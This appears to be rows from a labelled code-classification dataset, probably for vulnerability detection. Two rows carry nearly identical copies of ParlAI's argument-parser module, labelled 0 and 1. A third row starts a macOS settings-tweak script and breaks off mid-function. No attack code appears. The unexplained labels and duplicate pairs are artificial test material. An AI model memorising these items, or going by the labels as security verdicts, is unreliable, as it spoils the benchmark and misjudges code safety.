,Unnamed: 0,id,code,label
142,142,601668d569e1276e0b8bf2bf8fb43e391e10d170,"parlai/core/params.py/n/n# Copyright (c) 2017-present, Facebook, Inc.
# All rights reserved.
# This source code is licensed under the BSD-style license found in the
# LICENSE file in the root directory of this source tree. An additional grant
# of patent rights can be found in the PATENTS file in the same directory.
""""""Provides an argument parser and a set of default command line options for
using the ParlAI package.
""""""

import argparse
import importlib
import os
import sys
from parlai.core.agents import get_agent_module, get_task_module
from parlai.tasks.tasks import ids_to_tasks


def str2bool(value):
    v = value.lower()
    if v in ('yes', 'true', 't', '1', 'y'):
        return True
    elif v in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')


def str2class(value):
    """"""From import path string, returns the class specified. For example, the
    string 'parlai.agents.drqa.drqa:SimpleDictionaryAgent' returns
    <class 'parlai.agents.drqa.drqa.SimpleDictionaryAgent'>.
    """"""
    if ':' not in value:
        raise RuntimeError('Use a colon before the name of the class.')
    name = value.split(':')
    module = importlib.import_module(name[0])
    return getattr(module, name[1])


def class2str(value):
    """"""Inverse of params.str2class().""""""
    s = str(value)
    s = s[s.find('\'') + 1:s.rfind('\'')]  # pull out import path
    s = ':'.join(s.rsplit('.', 1))  # replace last period with ':'
    return s


def modelzoo_path(datapath, path):
    """"""If path starts with 'models', then we remap it to the model zoo path
    within the data directory (default is ParlAI/data/models).
    .""""""
    if path is None:
        return None
    if not path.startswith('models:'):
        return path
    else:
        # Check if we need to download the model
        animal = path[7:path.rfind('/')].replace('/', '.')
        module_name = f""parlai.zoo.{animal}""
        print(module_name)
        try:
            my_module = importlib.import_module(module_name)
            download = getattr(my_module, 'download')
            download(datapath)
        except (ModuleNotFoundError, AttributeError):
            pass
        return os.path.join(datapath, 'models', path[7:])


class ParlaiParser(argparse.ArgumentParser):
    """"""Pseudo-extension of ``argparse`` which sets a number of parameters
    for the ParlAI framework. More options can be added specific to other
    modules by passing this object and calling ``add_arg()`` or
    ``add_argument()`` on it.

    For example, see ``parlai.core.dict.DictionaryAgent.add_cmdline_args``.
    """"""

    def __init__(self, add_parlai_args=True, add_model_args=False):
        """"""Initializes the ParlAI argparser.
        - add_parlai_args (default True) initializes the default arguments for
        ParlAI package, including the data download paths and task arguments.
        - add_model_args (default False) initializes the default arguments for
        loading models, including initializing arguments from that model.
        """"""
        super().__init__(description='ParlAI parser.', allow_abbrev=False,
                         conflict_handler='resolve')
        self.register('type', 'bool', str2bool)
        self.register('type', 'class', str2class)
        self.parlai_home = (os.path.dirname(os.path.dirname(os.path.dirname(
                            os.path.realpath(__file__)))))
        os.environ['PARLAI_HOME'] = self.parlai_home

        self.add_arg = self.add_argument

        # remember which args were specified on the command line
        self.cli_args = sys.argv
        self.overridable = {}

        if add_parlai_args:
            self.add_parlai_args()
        if add_model_args:
            self.add_model_args()

    def add_parlai_data_path(self, argument_group=None):
        if argument_group is None:
            argument_group = self
        default_data_path = os.path.join(self.parlai_home, 'data')
        argument_group.add_argument(
            '-dp', '--datapath', default=default_data_path,
            help='path to datasets, defaults to {parlai_dir}/data')

    def add_mturk_args(self):
        mturk = self.add_argument_group('Mechanical Turk')
        default_log_path = os.path.join(self.parlai_home, 'logs', 'mturk')
        mturk.add_argument(
            '--mturk-log-path', default=default_log_path,
            help='path to MTurk logs, defaults to {parlai_dir}/logs/mturk')
        mturk.add_argument(
            '-t', '--task',
            help='MTurk task, e.g. ""qa_data_collection"" or ""model_evaluator""')
        mturk.add_argument(
            '-nc', '--num-conversations', default=1, type=int,
            help='number of conversations you want to create for this task')
        mturk.add_argument(
            '--unique', dest='unique_worker', default=False,
            action='store_true',
            help='enforce that no worker can work on your task twice')
        mturk.add_argument(
            '--unique-qual-name', dest='unique_qual_name',
            default=None, type=str,
            help='qualification name to use for uniqueness between HITs')
        mturk.add_argument(
            '-r', '--reward', default=0.05, type=float,
            help='reward for each worker for finishing the conversation, '
                 'in US dollars')
        mturk.add_argument(
            '--sandbox', dest='is_sandbox', action='store_true',
            help='submit the HITs to MTurk sandbox site')
        mturk.add_argument(
            '--live', dest='is_sandbox', action='store_false',
            help='submit the HITs to MTurk live site')
        mturk.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        mturk.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        mturk.add_argument(
            '--hard-block', dest='hard_block', action='store_true',
            default=False,
            help='Hard block disconnecting Turkers from all of your HITs')
        mturk.add_argument(
            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        mturk.add_argument(
            '--block-qualification', dest='block_qualification', default='',
            help='Qualification to use for soft blocking users. By default '
                 'turkers are never blocked, though setting this will allow '
                 'you to filter out turkers that have disconnected too many '
                 'times on previous HITs where this qualification was set.')
        mturk.add_argument(
            '--count-complete', dest='count_complete',
            default=False, action='store_true',
            help='continue until the requested number of conversations are '
                 'completed rather than attempted')
        mturk.add_argument(
            '--allowed-conversations', dest='allowed_conversations',
            default=0, type=int,
            help='number of concurrent conversations that one mturk worker '
                 'is able to be involved in, 0 is unlimited')
        mturk.add_argument(
            '--max-connections', dest='max_connections',
            default=30, type=int,
            help='number of HITs that can be launched at the same time, 0 is '
                 'unlimited.'
        )
        mturk.add_argument(
            '--min-messages', dest='min_messages',
            default=0, type=int,
            help='number of messages required to be sent by MTurk agent when '
                 'considering whether to approve a HIT in the event of a '
                 'partner disconnect. I.e. if the number of messages '
                 'exceeds this number, the turker can submit the HIT.'
        )
        mturk.add_argument(
            '--local', dest='local', default=False, action='store_true',
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        mturk.set_defaults(is_sandbox=True)
        mturk.set_defaults(is_debug=False)
        mturk.set_defaults(verbose=False)

    def add_messenger_args(self):
        messenger = self.add_argument_group('Facebook Messenger')
        messenger.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        messenger.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        messenger.add_argument(
            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        messenger.add_argument(
            '--force-page-token', dest='force_page_token', action='store_true',
            help='override the page token stored in the cache for a new one')
        messenger.add_argument(
            '--password', dest='password', type=str, default=None,
            help='Require a password for entry to the bot')
        messenger.add_argument(
            '--local', dest='local', action='store_true', default=False,
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        messenger.set_defaults(is_debug=False)
        messenger.set_defaults(verbose=False)

    def add_parlai_args(self, args=None):
        default_downloads_path = os.path.join(self.parlai_home, 'downloads')
        parlai = self.add_argument_group('Main ParlAI Arguments')
        parlai.add_argument(
            '-t', '--task',
            help='ParlAI task(s), e.g. ""babi:Task1"" or ""babi,cbt""')
        parlai.add_argument(
            '--download-path', default=default_downloads_path,
            help='path for non-data dependencies to store any needed files.'
                 'defaults to {parlai_dir}/downloads')
        parlai.add_argument(
            '-dt', '--datatype', default='train',
            choices=['train', 'train:stream', 'train:ordered',
                     'train:ordered:stream', 'train:stream:ordered',
                     'valid', 'valid:stream', 'test', 'test:stream'],
            help='choose from: train, train:ordered, valid, test. to stream '
                 'data add "":stream"" to any option (e.g., train:stream). '
                 'by default: train is random with replacement, '
                 'valid is ordered, test is ordered.')
        parlai.add_argument(
            '-im', '--image-mode', default='raw', type=str,
            help='image preprocessor to use. default is ""raw"". set to ""none"" '
                 'to skip image loading.')
        parlai.add_argument(
            '-nt', '--numthreads', default=1, type=int,
            help='number of threads. If batchsize set to 1, used for hogwild; '
                 'otherwise, used for number of threads in threadpool loading,'
                 ' e.g. in vqa')
        parlai.add_argument(
            '--hide-labels', default=False, type='bool',
            help='default (False) moves labels in valid and test sets to the '
                 'eval_labels field. If True, they are hidden completely.')
        batch = self.add_argument_group('Batching Arguments')
        batch.add_argument(
            '-bs', '--batchsize', default=1, type=int,
            help='batch size for minibatch training schemes')
        batch.add_argument('-bsrt', '--batch-sort', default=True, type='bool',
                           help='If enabled (default True), create batches by '
                                'flattening all episodes to have exactly one '
                                'utterance exchange and then sorting all the '
                                'examples according to their length. This '
                                'dramatically reduces the amount of padding '
                                'present after examples have been parsed, '
                                'speeding up training.')
        batch.add_argument('-clen', '--context-length', default=-1, type=int,
                           help='Number of past utterances to remember when '
                                'building flattened batches of data in multi-'
                                'example episodes.')
        batch.add_argument('-incl', '--include-labels',
                           default=True, type='bool',
                           help='Specifies whether or not to include labels '
                                'as past utterances when building flattened '
                                'batches of data in multi-example episodes.')
        self.add_parlai_data_path(parlai)

    def add_model_args(self):
        """"""Add arguments related to models such as model files.""""""
        model_args = self.add_argument_group('ParlAI Model Arguments')
        model_args.add_argument(
            '-m', '--model', default=None,
            help='the model class name. can match parlai/agents/<model> for '
                 'agents in that directory, or can provide a fully specified '
                 'module for `from X import Y` via `-m X:Y` '
                 '(e.g. `-m parlai.agents.seq2seq.seq2seq:Seq2SeqAgent`)')
        model_args.add_argument(
            '-mf', '--model-file', default=None,
            help='model file name for loading and saving models')
        model_args.add_argument(
            '--dict-class',
            help='the class of the dictionary agent uses')

    def add_model_subargs(self, model):
        """"""Add arguments specific to a particular model.""""""
        agent = get_agent_module(model)
        try:
            if hasattr(agent, 'add_cmdline_args'):
                agent.add_cmdline_args(self)
        except argparse.ArgumentError:
            # already added
            pass
        try:
            if hasattr(agent, 'dictionary_class'):
                s = class2str(agent.dictionary_class())
                self.set_defaults(dict_class=s)
        except argparse.ArgumentError:
            # already added
            pass

    def add_task_args(self, task):
        """"""Add arguments specific to the specified task.""""""
        for t in ids_to_tasks(task).split(','):
            agent = get_task_module(t)
            try:
                if hasattr(agent, 'add_cmdline_args'):
                    agent.add_cmdline_args(self)
            except argparse.ArgumentError:
                # already added
                pass

    def add_image_args(self, image_mode):
        """"""Add additional arguments for handling images.""""""
        try:
            parlai = self.add_argument_group('ParlAI Image Preprocessing Arguments')
            parlai.add_argument('--image-size', type=int, default=256,
                                help='resizing dimension for images')
            parlai.add_argument('--image-cropsize', type=int, default=224,
                                help='crop dimension for images')
        except argparse.ArgumentError:
            # already added
            pass


    def add_extra_args(self, args=None):
        """"""Add more args depending on how known args are set.""""""
        parsed = vars(self.parse_known_args(args, nohelp=True)[0])

        # find which image mode specified if any, and add additional arguments
        image_mode = parsed.get('image_mode', None)
        if image_mode is not None and image_mode != 'none':
            self.add_image_args(image_mode)

        # find which task specified if any, and add its specific arguments
        task = parsed.get('task', None)
        if task is not None:
            self.add_task_args(task)
        evaltask = parsed.get('evaltask', None)
        if evaltask is not None:
            self.add_task_args(evaltask)

        # find which model specified if any, and add its specific arguments
        model = parsed.get('model', None)
        if model is not None:
            self.add_model_subargs(model)

        # reset parser-level defaults over any model-level defaults
        try:
            self.set_defaults(**self._defaults)
        except AttributeError:
            raise RuntimeError('Please file an issue on github that argparse '
                               'got an attribute error when parsing.')


    def parse_known_args(self, args=None, namespace=None, nohelp=False):
        """"""Custom parse known args to ignore help flag.""""""
        if nohelp:
            # ignore help
            args = sys.argv[1:] if args is None else args
            args = [a for a in args if a != '-h' and a != '--help']
        return super().parse_known_args(args, namespace)


    def parse_args(self, args=None, namespace=None, print_args=True):
        """"""Parses the provided arguments and returns a dictionary of the
        ``args``. We specifically remove items with ``None`` as values in order
        to support the style ``opt.get(key, default)``, which would otherwise
        return ``None``.
        """"""
        self.add_extra_args(args)
        self.args = super().parse_args(args=args)
        self.opt = vars(self.args)

        # custom post-parsing
        self.opt['parlai_home'] = self.parlai_home
        if 'batchsize' in self.opt and self.opt['batchsize'] <= 1:
            # hide batch options
            self.opt.pop('batch_sort', None)
            self.opt.pop('context_length', None)

        # set environment variables
        if self.opt.get('download_path'):
            os.environ['PARLAI_DOWNPATH'] = self.opt['download_path']
        if self.opt.get('datapath'):
            os.environ['PARLAI_DATAPATH'] = self.opt['datapath']

        # map filenames that start with 'models:' to point to the model zoo dir
        if self.opt.get('model_file') is not None:
            self.opt['model_file'] = modelzoo_path(self.opt.get('datapath'),
                                                   self.opt['model_file'])
        if self.opt.get('dict_file') is not None:
            self.opt['dict_file'] = modelzoo_path(self.opt.get('datapath'),
                                                  self.opt['dict_file'])

        # set all arguments specified in commandline as overridable
        option_strings_dict = {}
        store_true = []
        store_false = []
        for group in self._action_groups:
            for a in group._group_actions:
                if hasattr(a, 'option_strings'):
                    for option in a.option_strings:
                        option_strings_dict[option] = a.dest
                        if '_StoreTrueAction' in str(type(a)):
                            store_true.append(option)
                        elif '_StoreFalseAction' in str(type(a)):
                            store_false.append(option)

        for i in range(len(self.cli_args)):
            if self.cli_args[i] in option_strings_dict:
                if self.cli_args[i] in store_true:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        True
                elif self.cli_args[i] in store_false:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        False
                else:
                    if i < (len(self.cli_args) - 1) and \
                            self.cli_args[i+1][0] != '-':
                        self.overridable[option_strings_dict[self.cli_args[i]]] = \
                            self.cli_args[i+1]
        self.opt['override'] = self.overridable

        if print_args:
            self.print_args()

        return self.opt

    def print_args(self):
        """"""Print out all the arguments in this parser.""""""
        if not self.opt:
            self.parse_args(print_args=False)
        values = {}
        for key, value in self.opt.items():
            values[str(key)] = str(value)
        for group in self._action_groups:
            group_dict = {
                a.dest: getattr(self.args, a.dest, None)
                for a in group._group_actions
            }
            namespace = argparse.Namespace(**group_dict)
            count = 0
            for key in namespace.__dict__:
                if key in values:
                    if count == 0:
                        print('[ ' + group.title + ': ] ')
                    count += 1
                    print('[  ' + key + ': ' + values[key] + ' ]')

    def set_params(self, **kwargs):
        """"""Set overridable kwargs.""""""
        self.set_defaults(**kwargs)
        for k, v in kwargs.items():
            self.overridable[k] = v
/n/n/n",0
143,143,601668d569e1276e0b8bf2bf8fb43e391e10d170,"/parlai/core/params.py/n/n# Copyright (c) 2017-present, Facebook, Inc.
# All rights reserved.
# This source code is licensed under the BSD-style license found in the
# LICENSE file in the root directory of this source tree. An additional grant
# of patent rights can be found in the PATENTS file in the same directory.
""""""Provides an argument parser and a set of default command line options for
using the ParlAI package.
""""""

import argparse
import importlib
import os
import sys
from parlai.core.agents import get_agent_module, get_task_module
from parlai.tasks.tasks import ids_to_tasks


def str2bool(value):
    v = value.lower()
    if v in ('yes', 'true', 't', '1', 'y'):
        return True
    elif v in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')


def str2class(value):
    """"""From import path string, returns the class specified. For example, the
    string 'parlai.agents.drqa.drqa:SimpleDictionaryAgent' returns
    <class 'parlai.agents.drqa.drqa.SimpleDictionaryAgent'>.
    """"""
    if ':' not in value:
        raise RuntimeError('Use a colon before the name of the class.')
    name = value.split(':')
    module = importlib.import_module(name[0])
    return getattr(module, name[1])


def class2str(value):
    """"""Inverse of params.str2class().""""""
    s = str(value)
    s = s[s.find('\'') + 1:s.rfind('\'')]  # pull out import path
    s = ':'.join(s.rsplit('.', 1))  # replace last period with ':'
    return s


def modelzoo_path(datapath, path):
    """"""If path starts with 'models', then we remap it to the model zoo path
    within the data directory (default is ParlAI/data/models).
    .""""""
    if path is None:
        return None
    if not path.startswith('models:'):
        return path
    else:
        # Check if we need to download the model
        animal = path[7:path.rfind('/')].replace('/', '.')
        module_name = f""parlai.zoo.{animal}""
        print(module_name)
        try:
            my_module = importlib.import_module(module_name)
            download = getattr(my_module, 'download')
            download(datapath)
        except (ModuleNotFoundError, AttributeError):
            pass
        return os.path.join(datapath, 'models', path[7:])


class ParlaiParser(argparse.ArgumentParser):
    """"""Pseudo-extension of ``argparse`` which sets a number of parameters
    for the ParlAI framework. More options can be added specific to other
    modules by passing this object and calling ``add_arg()`` or
    ``add_argument()`` on it.

    For example, see ``parlai.core.dict.DictionaryAgent.add_cmdline_args``.
    """"""

    def __init__(self, add_parlai_args=True, add_model_args=False):
        """"""Initializes the ParlAI argparser.
        - add_parlai_args (default True) initializes the default arguments for
        ParlAI package, including the data download paths and task arguments.
        - add_model_args (default False) initializes the default arguments for
        loading models, including initializing arguments from that model.
        """"""
        super().__init__(description='ParlAI parser.', allow_abbrev=False,
                         conflict_handler='resolve')
        self.register('type', 'bool', str2bool)
        self.register('type', 'class', str2class)
        self.parlai_home = (os.path.dirname(os.path.dirname(os.path.dirname(
                            os.path.realpath(__file__)))))
        os.environ['PARLAI_HOME'] = self.parlai_home

        self.add_arg = self.add_argument

        # remember which args were specified on the command line
        self.cli_args = sys.argv
        self.overridable = {}

        if add_parlai_args:
            self.add_parlai_args()
        if add_model_args:
            self.add_model_args()

    def add_parlai_data_path(self, argument_group=None):
        if argument_group is None:
            argument_group = self
        default_data_path = os.path.join(self.parlai_home, 'data')
        argument_group.add_argument(
            '-dp', '--datapath', default=default_data_path,
            help='path to datasets, defaults to {parlai_dir}/data')

    def add_mturk_args(self):
        mturk = self.add_argument_group('Mechanical Turk')
        default_log_path = os.path.join(self.parlai_home, 'logs', 'mturk')
        mturk.add_argument(
            '--mturk-log-path', default=default_log_path,
            help='path to MTurk logs, defaults to {parlai_dir}/logs/mturk')
        mturk.add_argument(
            '-t', '--task',
            help='MTurk task, e.g. ""qa_data_collection"" or ""model_evaluator""')
        mturk.add_argument(
            '-nc', '--num-conversations', default=1, type=int,
            help='number of conversations you want to create for this task')
        mturk.add_argument(
            '--unique', dest='unique_worker', default=False,
            action='store_true',
            help='enforce that no worker can work on your task twice')
        mturk.add_argument(
            '--unique-qual-name', dest='unique_qual_name',
            default=None, type=str,
            help='qualification name to use for uniqueness between HITs')
        mturk.add_argument(
            '-r', '--reward', default=0.05, type=float,
            help='reward for each worker for finishing the conversation, '
                 'in US dollars')
        mturk.add_argument(
            '--sandbox', dest='is_sandbox', action='store_true',
            help='submit the HITs to MTurk sandbox site')
        mturk.add_argument(
            '--live', dest='is_sandbox', action='store_false',
            help='submit the HITs to MTurk live site')
        mturk.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        mturk.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        mturk.add_argument(
            '--hard-block', dest='hard_block', action='store_true',
            default=False,
            help='Hard block disconnecting Turkers from all of your HITs')
        mturk.add_argument(
            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        mturk.add_argument(
            '--block-qualification', dest='block_qualification', default='',
            help='Qualification to use for soft blocking users. By default '
                 'turkers are never blocked, though setting this will allow '
                 'you to filter out turkers that have disconnected too many '
                 'times on previous HITs where this qualification was set.')
        mturk.add_argument(
            '--count-complete', dest='count_complete',
            default=False, action='store_true',
            help='continue until the requested number of conversations are '
                 'completed rather than attempted')
        mturk.add_argument(
            '--allowed-conversations', dest='allowed_conversations',
            default=0, type=int,
            help='number of concurrent conversations that one mturk worker '
                 'is able to be involved in, 0 is unlimited')
        mturk.add_argument(
            '--max-connections', dest='max_connections',
            default=30, type=int,
            help='number of HITs that can be launched at the same time, 0 is '
                 'unlimited.'
        )
        mturk.add_argument(
            '--min-messages', dest='min_messages',
            default=0, type=int,
            help='number of messages required to be sent by MTurk agent when '
                 'considering whether to approve a HIT in the event of a '
                 'partner disconnect. I.e. if the number of messages '
                 'exceeds this number, the turker can submit the HIT.'
        )
        mturk.add_argument(
            '--local', dest='local', default=False, action='store_true',
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        mturk.set_defaults(is_sandbox=True)
        mturk.set_defaults(is_debug=False)
        mturk.set_defaults(verbose=False)

    def add_messenger_args(self):
        messenger = self.add_argument_group('Facebook Messenger')
        messenger.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        messenger.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        messenger.add_argument(
            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        messenger.add_argument(
            '--force-page-token', dest='force_page_token', action='store_true',
            help='override the page token stored in the cache for a new one')
        messenger.add_argument(
            '--password', dest='password', type=str, default=None,
            help='Require a password for entry to the bot')
        messenger.add_argument(
            '--local', dest='local', action='store_true', default=False,
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        messenger.set_defaults(is_debug=False)
        messenger.set_defaults(verbose=False)

    def add_parlai_args(self, args=None):
        default_downloads_path = os.path.join(self.parlai_home, 'downloads')
        parlai = self.add_argument_group('Main ParlAI Arguments')
        parlai.add_argument(
            '-t', '--task',
            help='ParlAI task(s), e.g. ""babi:Task1"" or ""babi,cbt""')
        parlai.add_argument(
            '--download-path', default=default_downloads_path,
            help='path for non-data dependencies to store any needed files.'
                 'defaults to {parlai_dir}/downloads')
        parlai.add_argument(
            '-dt', '--datatype', default='train',
            choices=['train', 'train:stream', 'train:ordered',
                     'train:ordered:stream', 'train:stream:ordered',
                     'valid', 'valid:stream', 'test', 'test:stream'],
            help='choose from: train, train:ordered, valid, test. to stream '
                 'data add "":stream"" to any option (e.g., train:stream). '
                 'by default: train is random with replacement, '
                 'valid is ordered, test is ordered.')
        parlai.add_argument(
            '-im', '--image-mode', default='raw', type=str,
            help='image preprocessor to use. default is ""raw"". set to ""none"" '
                 'to skip image loading.')
        parlai.add_argument(
            '-nt', '--numthreads', default=1, type=int,
            help='number of threads. If batchsize set to 1, used for hogwild; '
                 'otherwise, used for number of threads in threadpool loading,'
                 ' e.g. in vqa')
        parlai.add_argument(
            '--hide-labels', default=False, type='bool',
            help='default (False) moves labels in valid and test sets to the '
                 'eval_labels field. If True, they are hidden completely.')
        batch = self.add_argument_group('Batching Arguments')
        batch.add_argument(
            '-bs', '--batchsize', default=1, type=int,
            help='batch size for minibatch training schemes')
        batch.add_argument('-bsrt', '--batch-sort', default=True, type='bool',
                           help='If enabled (default True), create batches by '
                                'flattening all episodes to have exactly one '
                                'utterance exchange and then sorting all the '
                                'examples according to their length. This '
                                'dramatically reduces the amount of padding '
                                'present after examples have been parsed, '
                                'speeding up training.')
        batch.add_argument('-clen', '--context-length', default=-1, type=int,
                           help='Number of past utterances to remember when '
                                'building flattened batches of data in multi-'
                                'example episodes.')
        batch.add_argument('-incl', '--include-labels',
                           default=True, type='bool',
                           help='Specifies whether or not to include labels '
                                'as past utterances when building flattened '
                                'batches of data in multi-example episodes.')
        self.add_parlai_data_path(parlai)

    def add_model_args(self):
        """"""Add arguments related to models such as model files.""""""
        model_args = self.add_argument_group('ParlAI Model Arguments')
        model_args.add_argument(
            '-m', '--model', default=None,
            help='the model class name. can match parlai/agents/<model> for '
                 'agents in that directory, or can provide a fully specified '
                 'module for `from X import Y` via `-m X:Y` '
                 '(e.g. `-m parlai.agents.seq2seq.seq2seq:Seq2SeqAgent`)')
        model_args.add_argument(
            '-mf', '--model-file', default=None,
            help='model file name for loading and saving models')
        model_args.add_argument(
            '--dict-class',
            help='the class of the dictionary agent uses')

    def add_model_subargs(self, model):
        """"""Add arguments specific to a particular model.""""""
        agent = get_agent_module(model)
        try:
            if hasattr(agent, 'add_cmdline_args'):
                agent.add_cmdline_args(self)
        except argparse.ArgumentError:
            # already added
            pass
        try:
            if hasattr(agent, 'dictionary_class'):
                s = class2str(agent.dictionary_class())
                self.set_defaults(dict_class=s)
        except argparse.ArgumentError:
            # already added
            pass

    def add_task_args(self, task):
        """"""Add arguments specific to the specified task.""""""
        for t in ids_to_tasks(task).split(','):
            agent = get_task_module(t)
            try:
                if hasattr(agent, 'add_cmdline_args'):
                    agent.add_cmdline_args(self)
            except argparse.ArgumentError:
                # already added
                pass

    def add_image_args(self, image_mode):
        """"""Add additional arguments for handling images.""""""
        try:
            parlai = self.add_argument_group('ParlAI Image Preprocessing Arguments')
            parlai.add_argument('--image-size', type=int, default=256,
                                help='resizing dimension for images')
            parlai.add_argument('--image-cropsize', type=int, default=224,
                                help='crop dimension for images')
        except argparse.ArgumentError:
            # already added
            pass


    def add_extra_args(self, args=None):
        """"""Add more args depending on how known args are set.""""""
        parsed = vars(self.parse_known_args(nohelp=True)[0])

        # find which image mode specified if any, and add additional arguments
        image_mode = parsed.get('image_mode', None)
        if image_mode is not None and image_mode != 'none':
            self.add_image_args(image_mode)

        # find which task specified if any, and add its specific arguments
        task = parsed.get('task', None)
        if task is not None:
            self.add_task_args(task)
        evaltask = parsed.get('evaltask', None)
        if evaltask is not None:
            self.add_task_args(evaltask)

        # find which model specified if any, and add its specific arguments
        model = parsed.get('model', None)
        if model is not None:
            self.add_model_subargs(model)

        # reset parser-level defaults over any model-level defaults
        try:
            self.set_defaults(**self._defaults)
        except AttributeError:
            raise RuntimeError('Please file an issue on github that argparse '
                               'got an attribute error when parsing.')


    def parse_known_args(self, args=None, namespace=None, nohelp=False):
        """"""Custom parse known args to ignore help flag.""""""
        if nohelp:
            # ignore help
            args = sys.argv[1:] if args is None else args
            args = [a for a in args if a != '-h' and a != '--help']
        return super().parse_known_args(args, namespace)


    def parse_args(self, args=None, namespace=None, print_args=True):
        """"""Parses the provided arguments and returns a dictionary of the
        ``args``. We specifically remove items with ``None`` as values in order
        to support the style ``opt.get(key, default)``, which would otherwise
        return ``None``.
        """"""
        self.add_extra_args(args)
        self.args = super().parse_args(args=args)
        self.opt = vars(self.args)

        # custom post-parsing
        self.opt['parlai_home'] = self.parlai_home
        if 'batchsize' in self.opt and self.opt['batchsize'] <= 1:
            # hide batch options
            self.opt.pop('batch_sort', None)
            self.opt.pop('context_length', None)

        # set environment variables
        if self.opt.get('download_path'):
            os.environ['PARLAI_DOWNPATH'] = self.opt['download_path']
        if self.opt.get('datapath'):
            os.environ['PARLAI_DATAPATH'] = self.opt['datapath']

        # map filenames that start with 'models:' to point to the model zoo dir
        if self.opt.get('model_file') is not None:
            self.opt['model_file'] = modelzoo_path(self.opt.get('datapath'),
                                                   self.opt['model_file'])
        if self.opt.get('dict_file') is not None:
            self.opt['dict_file'] = modelzoo_path(self.opt.get('datapath'),
                                                  self.opt['dict_file'])

        # set all arguments specified in commandline as overridable
        option_strings_dict = {}
        store_true = []
        store_false = []
        for group in self._action_groups:
            for a in group._group_actions:
                if hasattr(a, 'option_strings'):
                    for option in a.option_strings:
                        option_strings_dict[option] = a.dest
                        if '_StoreTrueAction' in str(type(a)):
                            store_true.append(option)
                        elif '_StoreFalseAction' in str(type(a)):
                            store_false.append(option)

        for i in range(len(self.cli_args)):
            if self.cli_args[i] in option_strings_dict:
                if self.cli_args[i] in store_true:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        True
                elif self.cli_args[i] in store_false:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        False
                else:
                    if i < (len(self.cli_args) - 1) and \
                            self.cli_args[i+1][0] != '-':
                        self.overridable[option_strings_dict[self.cli_args[i]]] = \
                            self.cli_args[i+1]
        self.opt['override'] = self.overridable

        if print_args:
            self.print_args()

        return self.opt

    def print_args(self):
        """"""Print out all the arguments in this parser.""""""
        if not self.opt:
            self.parse_args(print_args=False)
        values = {}
        for key, value in self.opt.items():
            values[str(key)] = str(value)
        for group in self._action_groups:
            group_dict = {
                a.dest: getattr(self.args, a.dest, None)
                for a in group._group_actions
            }
            namespace = argparse.Namespace(**group_dict)
            count = 0
            for key in namespace.__dict__:
                if key in values:
                    if count == 0:
                        print('[ ' + group.title + ': ] ')
                    count += 1
                    print('[  ' + key + ': ' + values[key] + ' ]')

    def set_params(self, **kwargs):
        """"""Set overridable kwargs.""""""
        self.set_defaults(**kwargs)
        for k, v in kwargs.items():
            self.overridable[k] = v
/n/n/n",1
24,24,bb2ded2dbbbac8966a77cc8aa227011a8b8772c0,"os-x-config/standard_tweaks/install_mac_tweaks.py/n/n#! /usr/bin/env python3
""""""
Set user settings to optimize performance, Finder and windowing features, and automate standard preference
settings.

While this is an Apple specific script, it doesn't check to see if it's executing on a Mac.
""""""

import dglogger
import argparse
import os
import getpass
import grp
import platform
import re
import pexpect
import shlex
import subprocess
import sys


def is_admin():
    """"""Check to see if the user belongs to the 'admin' group.

    :return: boolean
    """"""
    return os.getlogin() in grp.getgrnam('admin').gr_mem


def is_executable(tweak_group, groups, is_admin = is_admin()):
    """"""Determines if the tweak should be executed.

    :param tweak_group: tweak's group key value.
    :param groups: groups specified on the command line.
    :param is_admin: True if user belongs to 'admn' group.
    :rtype: boolean
    """"""
    # return True # for testing
    if groups is None and tweak_group != 'sudo':
        return True
    if groups is None and tweak_group == 'sudo' and is_admin:
        return True
    if groups is not None and tweak_group in groups and tweak_group != 'sudo':
        return True
    if groups is not None and tweak_group in groups and tweak_group == 'sudo' and is_admin:
        return True
    return False


def os_supported(min_v, max_v):
    """"""Checks to see if the preference is supported on your version of the Mac OS.
    NB: 10.9 is represented in the tweaks.py file as 10.09.

    :param min_v:
    :param max_v:
    :return: boolean
    """"""
    os_version = re.match('[0-9]+\.[0-9]+', platform.mac_ver()[0]).group(0)  # major.minor
    return not (os_version < str(min_v) or (max_v is not None and os_version > str(max_v)))


def run_batch_mode(tweaks, args):
    for t in tweaks:
        if os_supported(t['os_v_min'], t['os_v_max']) \
                and is_executable(t['group'], args.groups, is_admin()) \
                and t['group'] != 'test':
            run_command(t['set'])


def run_command(cmd):
    try:
        subprocess.run(shlex.split(cmd), shell=False, timeout=60, check=True)
        dglogger.log_info(str(cmd))
    except subprocess.CalledProcessError as e:
#        dglogger.log_error(e, file=sys.stderr)
        dglogger.log_error(str(e)) # figure out deal w/file=sys.stderr!
    except subprocess.TimeoutExpired as e:
        dglogger.log_error(e, file=sys.stderr)
    except OSError as e:
